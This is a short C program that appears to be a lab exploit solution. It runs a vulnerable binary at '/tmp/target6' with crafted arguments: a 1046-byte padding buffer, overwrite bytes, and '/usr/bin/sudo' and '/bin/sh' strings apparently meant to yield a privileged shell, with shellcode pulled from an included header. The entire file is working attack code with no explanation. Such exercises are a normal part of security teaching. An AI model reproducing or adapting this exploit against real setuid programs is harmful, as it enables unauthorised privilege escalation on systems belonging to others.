#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
	char arg1[] = "password";
	char arg2[] = "/usr/bin/sudo";
	char arg3[] = "/bin/sh";
	char arg4[] = "-c";
	char arg5[] = "/bin/sh";
	char arg6[] = "echo";
	char arg7[1046];
	char arg8[4];
	arg8[0] = 0x02;
	arg8[1] = 0x80;
	arg8[2] = 0x01;
	arg8[3] = '\0';

	memset(arg7, ' ', 1046);
	arg7[1045] = '\0';
	
	char *args[] = { TARGET, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
